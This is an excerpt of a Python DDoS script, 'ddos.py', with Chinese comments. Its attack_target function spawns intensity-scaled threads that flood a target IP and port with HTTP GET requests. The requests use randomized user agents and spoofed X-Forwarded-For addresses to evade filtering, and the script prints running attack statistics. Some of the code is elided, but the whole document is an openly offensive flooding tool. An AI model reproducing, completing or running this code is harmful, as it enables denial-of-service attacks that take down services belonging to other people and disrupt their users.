...
import socket
import threading
def attack_target(ip, port, intensity):

    import time
    from datetime import datetime
    
    # 根据强度设置线程数
    thread_count = intensity * 100
    request_count = 0
    running = True
    start_time = datetime.now()
    
    print(f"开始攻击目标: {ip}:{port} - ddos.py:462")
    print(f"攻击强度: {intensity} - ddos.py:463")
    print(f"线程数: {thread_count} - ddos.py:464")
    print("= - ddos.py:465" * 50)
    
    def create_http_request():
        """创建HTTP请求"""
        # 随机选择用户代理和Accept头
        user_agent = random.choice(useragents)
        accept_header = random.choice(Accept)
        
        # 创建随机IP用于X-Forwarded-For
        random_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        # 构建HTTP请求
        request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {user_agent}\r\n{accept_header}X-Forwarded-For: {random_ip}\r\nConnection: Keep-Alive\r\n\r\n"
    ...
    def attack_thread(thread_id):
        ...
        while running:
            try:
                ...
                if thread_id == 0 and request_count % 100 == 0:
                    elapsed = datetime.now() - start_time
                    print(f"\r请求数: {request_count} | 运行时间: {elapsed} - ddos.py:508", end="")
                    
            except Exception as e:
                print(f"Error: {e} - ddos.py:511")
    ...
    print("攻击进行中... (按Ctrl+C停止) - ddos.py:530")
    ...
    print(f"\n攻击统计: - ddos.py:540")
    print(f"总运行时间: {duration} - ddos.py:541")
    print(f"总请求数: {request_count} - ddos.py:542")
    print(f"平均请求/秒: {request_count / max(duration.total_seconds(), 1):.2f} - ddos.py:543")
